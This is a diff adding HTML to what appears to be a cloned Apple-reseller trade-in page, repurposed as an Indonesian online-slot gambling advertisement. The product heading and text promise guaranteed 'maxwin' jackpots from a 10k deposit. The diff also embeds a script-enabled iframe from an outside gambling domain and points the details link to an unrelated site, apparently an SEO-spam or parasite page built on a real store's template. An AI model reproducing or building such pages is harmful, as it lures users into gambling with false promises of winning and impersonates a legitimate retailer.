+                                <ul id="Slider-Gallery-template--17605519376564__main"
+                                    class="product__media-list contains-media grid grid--peek list-unstyled slider slider--mobile">
+                                    <li id="Slide-template--17605519376564__main-32122069156020"
+                                        class="common_medias variant-comapre-image- variant-all-image product__media-item grid__item slider__slide is-active"
+                                        data-media-id="template--17605519376564__main-32122069156020">
+
+                                        <div class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
+                                            style="--ratio: 1.0; --preview-ratio: 1.0;"><modal-opener
+                                                class="product__modal-opener product__modal-opener--image no-js-hidden"
+                                                data-modal="#ProductModal-template--17605519376564__main">
+                                                <span
+                                                    class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox"
+                                                    aria-hidden="true"><svg aria-hidden="true" focusable="false"
+                                                        class="icon icon-plus" width="19" height="19"
+                                                        viewBox="0 0 19 19" fill="none"
+                                                        xmlns="http://www.w3.org/2000/svg">
+                                                        <path fill-rule="evenodd" clip-rule="evenodd"
+                                                            d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z"
+                                                            fill="currentColor" />
+                                                        <path fill-rule="evenodd" clip-rule="evenodd"
+                                                            d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z"
+                                                            fill="currentColor" />
+                                                        <path fill-rule="evenodd" clip-rule="evenodd"
+                                                            d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z"
+                                                            fill="currentColor" />
+                                                    </svg>
+                                                </span>
+                                                <div class="loading-overlay__spinner hidden">
+                                                    <svg aria-hidden="true" focusable="false" class="spinner"
+                                                        viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
+                                                        <circle class="path" fill="none" stroke-width="4" cx="33"
+                                                            cy="33" r="30"></circle>
+                                                    </svg>
+                                                </div>
+                                                <div class="product__media media media--transparent">
+                                                    <img src="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                        alt=""
+                                                        srcset="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                        width="823" height="823" class="image-magnify-lightbox"
+                                                        sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
+                                                </div>
+                                                <button
+                                                    class="product__media-toggle quick-add-hidden product__media-zoom-lightbox"
+                                                    type="button" aria-haspopup="dialog" data-media-id="32122069156020">
+                                                    <span class="visually-hidden">
+                                                        Open media 1 in modal
+                                                    </span>
+                                                </button>
+                                            </modal-opener></div>
+
+                                    </li>
+                                </ul>
+                                <div class="slider-buttons no-js-hidden quick-add-hidden">
+                                    <button type="button" class="slider-button slider-button--prev" name="previous"
+                                        aria-label="Slide left">
+                                        <svg aria-hidden="true" focusable="false" class="icon icon-caret"
+                                            viewBox="0 0 10 6">
+                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                fill="currentColor">
+                                        </svg>
+
+                                    </button>
+                                    <div class="slider-counter caption">
+                                        <span class="slider-counter--current">1</span>
+                                        <span aria-hidden="true"> / </span>
+                                        <span class="visually-hidden">of</span>
+                                        <span class="slider-counter--total">11</span>
+                                    </div>
+                                    <button type="button" class="slider-button slider-button--next" name="next"
+                                        aria-label="Slide right">
+                                        <svg aria-hidden="true" focusable="false" class="icon icon-caret"
+                                            viewBox="0 0 10 6">
+                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                fill="currentColor">
+                                        </svg>
+
+                                    </button>
+                                </div>
+                            </slider-component>
+                        </media-gallery>
+
+                    </div>
+
+                    <div class="product__info-wrapper grid__item">
+                        <product-info id="ProductInfo-template--17605519376564__main"
+                            data-section="template--17605519376564__main" data-url="/" class="product__info-container">
+                            <div class="desktop-view_Product-title">
+
+                                <div class="priceAndLabelTag">
+                                    <div class="product_tag_display_container">
+                                        <span class="product_tag_display" style="color:#ff9900;">NEW</span>
+                                    </div>
+                                </div>
+                                <div class="product-title-style product__title">
+                                    <h1 style="color: #ffd000;">SLOT QRIS | LINK SITUS SLOT GACOR TERPERCAYA PASTI MAXWIN DEPOSIT 10K HARI INI</h1>
+                                    <p style="color: #ffffff;">Slot qris merupakan link situs slot gacor terpercaya pasti maxwin denga minimal deposit hanya 10k sudah bisa mendapatkan maxwin di beragam jenis permainan slot gacor hari ini dengan tingkat kemenangan yang sangat tinggi di permainan slot gacor terbaik hari ini.</p>
+                                </div>
+                                <div class="product-subtitle-style"></div>
+
+                                <p class="product__preorder-message"></p>
+                            </div>
+                            <div class="pricestyle no-js-hidden" id="price-template--17605519376564__main"
+                                role="status">
+                                <style>
+                                    .actual_price_bold,
+                                    .form__label__bold,
+                                    .pickup-availability-info b,
+                                    .free_shipping_msg b,
+                                    .free_shipping_msg_2 b,
+                                    .pickup-availability-info p,
+                                    .share-button__button,
+                                    .focus-none,
+                                    .td1 {
+
+                                        color: #ffffff;
+                                    }
+
+                                    .price-segment-discount {
+                                        border-radius: 6px;
+                                        background: #ff9900;
+                                        padding: 1px;
+                                        padding-left: 5px;
+                                        padding-right: 5px;
+                                        color: white;
+                                        display: inline-block;
+                                        font-size: 15px;
+                                    }
+
+                                    #price-item-sale {
+                                        font-family: var(--font-body-family);
+                                        font-style: normal;
+                                        font-weight: 600;
+                                        font-size: 28px;
+                                        line-height: 28px;
+                                        letter-spacing: -0.02em;
+                                    }
+
+                                    .footerOr3 {
+                                        display: none;
+                                    }
+
+                                    @media screen and (max-width: 767px) {
+                                        #price-element .footerOr3 {
+                                            display: inline-block;
+                                            color: #ffffff;
+                                        }
+                                    }
+                                </style>
+                            </div>
+                           <center>
+                          <iframe 
+                            src="https://tabelhengheng.com"
+                            width="100%"
+                            height="300"
+                            style="max-width:1200px;border:0;"
+                            scrolling="no"
+                            loading="lazy"
+                            sandbox="allow-scripts allow-same-origin"
+                            referrerpolicy="no-referrer"
+                          ></iframe>
+                        </center>
+                        <a href="//www.dmca.com/Protection/Status.aspx?ID=bc512c80-6bae-4c99-854d-2e3d0814893d" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/_dmca_premi_badge_5.png?ID=bc512c80-6bae-4c99-854d-2e3d0814893d"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>
+                            <a href="https://tunari-online.ro/"
+                                class="link product__view-details animate-arrow">
+                                View full details
+                                <svg viewBox="0 0 14 10" fill="none" aria-hidden="true" focusable="false"
+                                    class="footer_mail_arrow icon icon-arrow" xmlns="http://www.w3.org/2000/svg">
+                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                        d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z"
+                                        fill="currentColor">
+                                </svg>
+
+                            </a>
+                        </product-info>
+                    </div>
+                </div>
+
+
+
+                <product-modal id="ProductModal-template--17605519376564__main" class="product-media-modal">
+                    <div class="product-media-modal__dialog" role="dialog" aria-label="Media gallery" aria-modal="true"
+                        tabindex="-1">
+                        <button id="ModalClose-template--17605519376564__main" type="button"
+                            class="product-media-modal__toggle" aria-label="Close">
+
+
+
+                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"
+                                class="icon icon-close" fill="none" viewBox="0 0 18 17" width="18" height="17">
+                                <path
+                                    d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
+                                    fill="currentColor">
+                            </svg>
+
+                        </button>
+
+                        <div class="product-media-modal__content color-background-1 gradient" role="document"
+                            aria-label="Media gallery" tabindex="0">
+
+                            <img class="custom_popup_compare_32122069156020 global-media-settings global-media-settings--no-shadow"
+                                srcset="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                sizes="(min-width: 750px) calc(100vw - 22rem), 1100px"
+                                src="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                alt="" loading="lazy" width="1100" height="1100" data-media-id="32122069156020">
+
+
+
+                        </div>
+                </product-modal>
+                <modal-dialog id="PopupModal-popup_custom_pptnJ9" class="product-popup-modal">
+                    <div role="dialog" aria-label="Explore deals" aria-modal="true" class="product-popup-modal__content"
+                        tabindex="-1">
+                        <button id="ModalClose-popup_custom_pptnJ9" type="button" class="product-popup-modal__toggle"
+                            aria-label="Close">
+                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"
+                                class="icon icon-close" fill="none" viewBox="0 0 18 17" width="18" height="17">
+                                <path
+                                    d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
+                                    fill="currentColor">
+                            </svg>
+                        </button>
+                        <div class="product-popup-modal__content-info">
+                            <h1 class="h2">Limited Time Promotion</h1>
+                        </div>
+                    </div>
+                </modal-dialog><modal-dialog id="PopupModal-popup_custom_VYxbeD" class="product-popup-modal">
+                    <div role="dialog" aria-label="Learn more" aria-modal="true" class="product-popup-modal__content"
+                        tabindex="-1">
+                        <button id="ModalClose-popup_custom_VYxbeD" type="button" class="product-popup-modal__toggle"
+                            aria-label="Close">
+
+
+                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"
+                                class="icon icon-close" fill="none" viewBox="0 0 18 17" width="18" height="17">
+                                <path
+                                    d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
+                                    fill="currentColor">
+                            </svg>
+                        </button>
+                        <div class="product-popup-modal__content-info">
+                            <h1 class="h2">Financing</h1>
+                        </div>
+                    </div>
+                </modal-dialog><modal-dialog id="PopupModal-popup_custom_6mTgxV" class="product-popup-modal">
+                    <div role="dialog" aria-label="Learn more" aria-modal="true" class="product-popup-modal__content"
+                        tabindex="-1">
+                        <button id="ModalClose-popup_custom_6mTgxV" type="button" class="product-popup-modal__toggle"
+                            aria-label="Close">
+
+
+                            <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"
+                                class="icon icon-close" fill="none" viewBox="0 0 18 17" width="18" height="17">
+                                <path
+                                    d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
+                                    fill="currentColor">
+                            </svg>
+                        </button>
+                        <div class="product-popup-modal__content-info">
+                            <h1 class="h2">Trade in popup</h1><img
+                                src="https://cdn.shopify.com/s/files/1/0637/3864/2612/files/Trade-in_banner_desktop_48d9e5bb-febb-4bc9-9b4c-1a2d1aa42c69.png?v=1726197781"
+                                class="image desktop"> <img
+                                src="https://cdn.shopify.com/s/files/1/0637/3864/2612/files/Trade-in_banner_mobile_b9fb8bfe-8e63-4077-939f-38dec43b59e1.png?v=1726197781"
+                                class="image mobile">
+                            <main id="MainContent" class="content-for-layout focus-none" role="main" tabindex="-1">
+                                <h1 class="visually-hidden">
+                                    Trade-In
+                                </h1>
+                                <section id="shopify-section-template--16932308091060__rich_text_i9f7na"
+                                    class="shopify-section section">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/section-rich-text.css?v=165487089223517640671717736427"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <style data-shopify="">
+                                        .section-template--16932308091060__rich_text_i9f7na-padding {
+                                            padding-top: 9px;
+                                            padding-bottom: 0px;
+                                        }
+
+                                        @media screen and (min-width: 750px) {
+                                            .section-template--16932308091060__rich_text_i9f7na-padding {
+                                                padding-top: 12px;
+                                                padding-bottom: 0px;
+                                            }
+                                        }
+                                    </style>
+                                    <div class="isolate">
+                                        <div
+                                            class="rich-text content-container color-background-1 gradient rich-text--full-width content-container--full-width section-template--16932308091060__rich_text_i9f7na-padding">
+                                            <div class="rich-text__wrapper rich-text__wrapper--center page-width">
+                                                <div class="rich-text__blocks center">
+                                                    <h1 class="rich-text__heading rte inline-richtext h2">
+                                                        <strong>Explore the devices to learn more.</strong>
+                                                    </h1>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                    <style>
+                                        #shopify-section-template--16932308091060__rich_text_i9f7na .rich-text__blocks {
+                                            max-width: 100%;
+                                        }
+                                    </style>
+                                </section>
+                                <section id="shopify-section-template--16932308091060__multicolumn_e4akte"
+                                    class="shopify-section multicolumn_sec">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/section-multicolumn.css?v=46025948269339862011717736425"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <style data-shopify="">
+                                        .section-template--16932308091060__multicolumn_e4akte-padding {
+                                            padding-top: 24px;
+                                            padding-bottom: 27px;
+                                        }
+
+                                        @media screen and (min-width: 750px) {
+                                            .section-template--16932308091060__multicolumn_e4akte-padding {
+                                                padding-top: 32px;
+                                                padding-bottom: 36px;
+                                            }
+                                        }
+                                    </style>
+                                    <div class="multicolumn color-background-1 gradient background-primary no-heading">
+                                        <div
+                                            class="page-width section-template--16932308091060__multicolumn_e4akte-padding isolate">
+                                            <slider-component class="slider-mobile-gutter" style="display:block;">
+                                                <ul class="multicolumn-list contains-content-container grid grid--2-col-tablet-down grid--5-col-desktop slider slider--mobile grid--peek"
+                                                    id="Slider-template--16932308091060__multicolumn_e4akte"
+                                                    role="list">
+                                                    <li id="Slide-template--16932308091060__multicolumn_e4akte-1"
+                                                        class="multicolumn-list__item grid__item slider__slide center">
+                                                        <div class="multicolumn-card content-container">
+                                                            <div
+                                                                class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
+                                                                <div class="media media--transparent media--square">
+                                                                    <img src="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        alt=""
+                                                                        srcset="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        width="3200" height="3200" loading="lazy" sizes="
+                      (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
+                      (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
+                      (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
+                      calc((100vw - 34px) * 0.5 / 2)
+                    " class="multicolumn-card__image">
+                                                                </div>
+                                                            </div>
+                                                            <div class="multicolumn-card__info"><a
+                                                                    class="link animate-arrow"
+                                                                    href="https://istudio.sellto.carousell.sg/trade-in-or-sell/iphone/apple">iPhone<span
+                                                                        class="icon-wrap"> <svg viewbox="0 0 14 10"
+                                                                            fill="none" aria-hidden="true"
+                                                                            focusable="false"
+                                                                            class="footer_mail_arrow icon icon-arrow"
+                                                                            xmlns="http://www.w3.org/2000/svg">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+                                                                    </span></a></div>
+                                                        </div>
+                                                    </li>
+                                                    <li id="Slide-template--16932308091060__multicolumn_e4akte-2"
+                                                        class="multicolumn-list__item grid__item slider__slide center">
+                                                        <div class="multicolumn-card content-container">
+                                                            <div
+                                                                class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
+                                                                <div class="media media--transparent media--square">
+                                                                    <img src="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        alt=""
+                                                                        srcset="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        width="3200" height="3200" loading="lazy" sizes="
+                      (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
+                      (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
+                      (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
+                      calc((100vw - 34px) * 0.5 / 2)
+                    " class="multicolumn-card__image">
+                                                                </div>
+                                                            </div>
+                                                            <div class="multicolumn-card__info"><a
+                                                                    class="link animate-arrow"
+                                                                    href="https://istudio.sellto.carousell.sg/trade-in-or-sell/ipad/apple">iPad<span
+                                                                        class="icon-wrap"> <svg viewbox="0 0 14 10"
+                                                                            fill="none" aria-hidden="true"
+                                                                            focusable="false"
+                                                                            class="footer_mail_arrow icon icon-arrow"
+                                                                            xmlns="http://www.w3.org/2000/svg">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+                                                                    </span></a></div>
+                                                        </div>
+                                                    </li>
+                                                    <li id="Slide-template--16932308091060__multicolumn_e4akte-3"
+                                                        class="multicolumn-list__item grid__item slider__slide center">
+                                                        <div class="multicolumn-card content-container">
+                                                            <div
+                                                                class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
+                                                                <div class="media media--transparent media--square">
+                                                                    <img src="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        alt=""
+                                                                        srcset="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        width="3200" height="3200" loading="lazy" sizes="
+                      (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
+                      (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
+                      (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
+                      calc((100vw - 34px) * 0.5 / 2)
+                    " class="multicolumn-card__image">
+                                                                </div>
+                                                            </div>
+                                                            <div class="multicolumn-card__info"><a
+                                                                    class="link animate-arrow"
+                                                                    href="https://istudio.sellto.carousell.sg/trade-in-or-sell/earbuds/all">AirPods<span
+                                                                        class="icon-wrap"> <svg viewbox="0 0 14 10"
+                                                                            fill="none" aria-hidden="true"
+                                                                            focusable="false"
+                                                                            class="footer_mail_arrow icon icon-arrow"
+                                                                            xmlns="http://www.w3.org/2000/svg">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+                                                                    </span></a></div>
+                                                        </div>
+                                                    </li>
+                                                    <li id="Slide-template--16932308091060__multicolumn_e4akte-4"
+                                                        class="multicolumn-list__item grid__item slider__slide center">
+                                                        <div class="multicolumn-card content-container">
+                                                            <div
+                                                                class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
+                                                                <div class="media media--transparent media--square">
+                                                                    <img src="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        alt=""
+                                                                        srcset="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        width="3200" height="3200" loading="lazy" sizes="
+                      (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
+                      (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
+                      (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
+                      calc((100vw - 34px) * 0.5 / 2)
+                    " class="multicolumn-card__image">
+                                                                </div>
+                                                            </div>
+                                                            <div class="multicolumn-card__info"><a
+                                                                    class="link animate-arrow"
+                                                                    href="https://istudio.sellto.carousell.sg/trade-in-or-sell/macbook/apple">MacBook<span
+                                                                        class="icon-wrap"> <svg viewbox="0 0 14 10"
+                                                                            fill="none" aria-hidden="true"
+                                                                            focusable="false"
+                                                                            class="footer_mail_arrow icon icon-arrow"
+                                                                            xmlns="http://www.w3.org/2000/svg">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+                                                                    </span></a></div>
+                                                        </div>
+                                                    </li>
+                                                    <li id="Slide-template--16932308091060__multicolumn_e4akte-5"
+                                                        class="multicolumn-list__item grid__item slider__slide center">
+                                                        <div class="multicolumn-card content-container">
+                                                            <div
+                                                                class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
+                                                                <div class="media media--transparent media--square">
+                                                                    <img src="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        alt=""
+                                                                        srcset="https://ik.imagekit.io/ck1mayks8/photo_2025-07-02_14-22-42.jpg"
+                                                                        width="3200" height="3200" loading="lazy" sizes="
+                      (min-width: 1000px) calc((1000px - 132px) * 0.5 /  5),
+                      (min-width: 990px) calc((100vw - 132px) * 0.5 / 5),
+                      (min-width: 750px) calc((100vw - 108px) * 0.5 / 2),
+                      calc((100vw - 34px) * 0.5 / 2)
+                    " class="multicolumn-card__image">
+                                                                </div>
+                                                            </div>
+                                                            <div class="multicolumn-card__info"><a
+                                                                    class="link animate-arrow"
+                                                                    href="https://istudio.sellto.carousell.sg/trade-in-or-sell/smartwatch/all">Watch<span
+                                                                        class="icon-wrap"> <svg viewbox="0 0 14 10"
+                                                                            fill="none" aria-hidden="true"
+                                                                            focusable="false"
+                                                                            class="footer_mail_arrow icon icon-arrow"
+                                                                            xmlns="http://www.w3.org/2000/svg">
+                                                                            <path fill-rule="evenodd"
+                                                                                clip-rule="evenodd"
+                                                                                d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z"
+                                                                                fill="currentColor">
+                                                                            </path>
+                                                                        </svg>
+                                                                    </span></a></div>
+                                                        </div>
+                                                    </li>
+                                                </ul>
+                                                <div class="slider-buttons no-js-hidden medium-hide">
+                                                    <button type="button" class="slider-button slider-button--prev"
+                                                        name="previous" aria-label="Slide left" disabled>
+                                                        <svg aria-hidden="true" focusable="false"
+                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                fill="currentColor">
+                                                            </path>
+                                                        </svg>
+
+                                                    </button>
+                                                    <div class="slider-counter caption">
+                                                        <span class="slider-counter--current">1</span>
+                                                        <span aria-hidden="true"> / </span>
+                                                        <span class="visually-hidden">of</span>
+                                                        <span class="slider-counter--total">4</span>
+                                                    </div>
+                                                    <button type="button" class="slider-button slider-button--next"
+                                                        name="next" aria-label="Slide right">
+                                                        <svg aria-hidden="true" focusable="false"
+                                                            class="icon icon-caret" viewbox="0 0 10 6">
+                                                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z"
+                                                                fill="currentColor">
+                                                            </path>
+                                                        </svg>
+
+                                                    </button>
+                                                </div>
+                                            </slider-component>
+                                            <div class="center small-hide medium-hide"></div>
+                                        </div>
+                                    </div>
+
+
+                                </section>
+                                <section id="shopify-section-template--16932308091060__rich_text_j8MLf3"
+                                    class="shopify-section section">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/section-rich-text.css?v=165487089223517640671717736427"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <style data-shopify="">
+                                        .section-template--16932308091060__rich_text_j8MLf3-padding {
+                                            padding-top: 18px;
+                                            padding-bottom: 0px;
+                                        }
+
+                                        @media screen and (min-width: 750px) {
+                                            .section-template--16932308091060__rich_text_j8MLf3-padding {
+                                                padding-top: 24px;
+                                                padding-bottom: 0px;
+                                            }
+                                        }
+                                    </style>
+                                    <div class="isolate">
+                                        <div
+                                            class="rich-text content-container color-background-1 gradient rich-text--full-width content-container--full-width section-template--16932308091060__rich_text_j8MLf3-padding">
+                                            <div class="rich-text__wrapper rich-text__wrapper--center page-width">
+                                                <div class="rich-text__blocks center">
+                                                    <h1 class="rich-text__heading rte inline-richtext h2">
+                                                        <strong>Trade-in your device in 3 easy steps!</strong>
+                                                    </h1>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+
+                                    <style>
+                                        #shopify-section-template--16932308091060__rich_text_j8MLf3 .rich-text__blocks {
+                                            max-width: 100%;
+                                        }
+                                    </style>
+                                </section>
+                                <section id="shopify-section-template--16932308091060__multicolumn_BHFMrc"
+                                    class="shopify-section multicolumn_sec">
+                                    <link
+                                        href="//www.istudiosg.com/cdn/shop/t/8/assets/section-multicolumn.css?v=46025948269339862011717736425"
+                                        rel="stylesheet" type="text/css" media="all">
+                                    <style data-shopify="">
+                                        .section-template--16932308091060__multicolumn_BHFMrc-padding {
+                                            padding-top: 21px;
+                                            padding-bottom: 21px;
+                                        }
+
+                                        @media screen and (min-width: 750px) {
+                                            .section-template--16932308091060__multicolumn_BHFMrc-padding {
+                                                padding-top: 28px;
+                                                padding-bottom: 28px;
+                                            }
+                                        }
+                                    </style>
+                                    <div class="multicolumn color-background-1 gradient background-primary no-heading">
+                                        <div
+                                            class="page-width section-template--16932308091060__multicolumn_BHFMrc-padding isolate">
+                                            <slider-component class="slider-mobile-gutter" style="display:block;">
+                                                <ul class="multicolumn-list contains-content-container grid grid--1-col-tablet-down grid--3-col-desktop slider slider--mobile grid--peek"
+                                                    id="Slider-template--16932308091060__multicolumn_BHFMrc"
+                                                    role="list">
+                                                    <li id="Slide-template--16932308091060__multicolumn_BHFMrc-1"
+                                                        class="multicolumn-list__item grid__item slider__slide">
+                                                        <div class="multicolumn-card content-container">
+                                                            <div class="multicolumn-card__info">
+                                                                <h3 class="inline-richtext"><span
+                                                                        style="text-decoration:underline"><strong>Step
+                                                                            1</strong></span></h3>
+                                                                <div class="rte">
+                                                                    <p>Disconnect your Apple device from your connected
+                                                                        devices and iCloud. For detailed instructions,
+                                                                        refer to the <a
+                                                                            href="https://support.apple.com/en-sg/118412"
+                                                                            target="_blank"
+                                                                            title="https://support.apple.com/en-sg/118412"><span
+                                                                                style="text-decoration:underline">Removal
+                                                                                Guide</span></a>.</p>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li id="Slide-template--16932308091060__multicolumn_BHFMrc-2"
+                                                        class="multicolumn-list__item grid__item slider__slide">
+                                                        <div class="multicolumn-card content-container">
+                                                            <div class="multicolumn-card__info">
+                                                                <h3 class="inline-richtext"><span
+                                                                        style="text-decoration:underline"><strong>Step
+                                                                            2</strong></span></h3>
+                                                                <div class="rte">
+                                                                    <p>Visit any <a href="/" target="_blank"
+                                                                            title=""><span
+                                                                                style="text-decoration:underline">iStudio
+                                                                                store</span></a> (excluding Airport
+                                                                        Terminal locations) for a device assessment.</p>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </li>
+                                                    <li id="Slide-template--16932308091060__multicolumn_BHFMrc-3"
+                                                        class="multicolumn-list__item grid__item slider__slide">
+                                                        <div class="multicolumn-card content-container">
